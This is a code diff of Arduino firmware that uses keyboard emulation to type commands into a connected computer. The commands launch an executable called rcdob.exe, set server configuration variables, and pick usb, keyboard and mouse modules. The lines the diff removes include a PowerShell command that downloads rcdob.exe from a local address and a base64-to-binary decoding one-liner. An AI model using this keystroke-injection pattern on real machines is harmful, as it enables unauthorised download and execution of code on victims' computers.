@@ -1,11 +1,9 @@
 #include "Keyboard.h"
 
-char binaryCmdline[] = "start rcdob.exe ";
+char binaryCmdline[] = "start rcdob.exe";
 char userAgentConfig[] = "set RCDO_USERAGENT=firefox";
 char serverNameConfig[] = "set RCDO_SERVERPORT=localhost";
 char serverPortConfig[] = "set RCDO_SERVERNAME=5000";
-char powershellCmd[] = "iwr -Uri \"http://127.0.0.1/download\" -OutFile rcdob.exe";
-//$file = ".\input.txt"; [System.Convert]::FromBase64String((Get-Content $file)) | Set-Content output.bin -Encoding Byte
 
 
 float getVCC() {
@@ -47,27 +45,24 @@ float getBattVoltage(void) {
 }
 
 
-char* selectModules(uint8_t menuSelected){
+char* selectModules(int *menuSelected){
   char* modules = (char*)calloc(512,1);
   if (modules == NULL){
     // handle error
     return "";
   }
-  switch(menuSelected){
-    case 1:
-      strcpy(modules,"PLACEHOLDER1");
-      break;
-    case 2:
-      strcpy(modules,"PLACEHOLDER2");
-      break;
-    case 3:
-      strcpy(modules,"PLACEHOLDER3");
-      break;
-    case 4:
-      strcpy(modules,"PLACEHOLDER4");
-      break;
-    default:
-      break;
+
+  if (menuSelected[0]){
+    strcat(modules," usb");
+  }
+  if (menuSelected[1]){
+    strcat(modules," keyboard");
+  }
+  if (menuSelected[2]){
+    strcat(modules," mouse");
+  }
+  if (menuSelected[3]){
+    strcat(modules," PLACEHOLDER1");
   }
   return modules;
 }
@@ -101,8 +96,10 @@ void setupConfig(){
   Keyboard.write(KEY_RETURN);
 }
 
-void startBinary(int option){
-  SerialMonitorInterface.print(getVCC());
+void startBinary(int *option){
+  for (int i=0; i < 4; i++){
+    SerialMonitorInterface.print(option[i]);
+  }
   pinMode(LED_BUILTIN, OUTPUT);
 
   // blocking loop until plugged in
@@ -143,5 +140,4 @@ void startBinary(int option){
   
   free(mods);
   Keyboard.end();
-  
 }
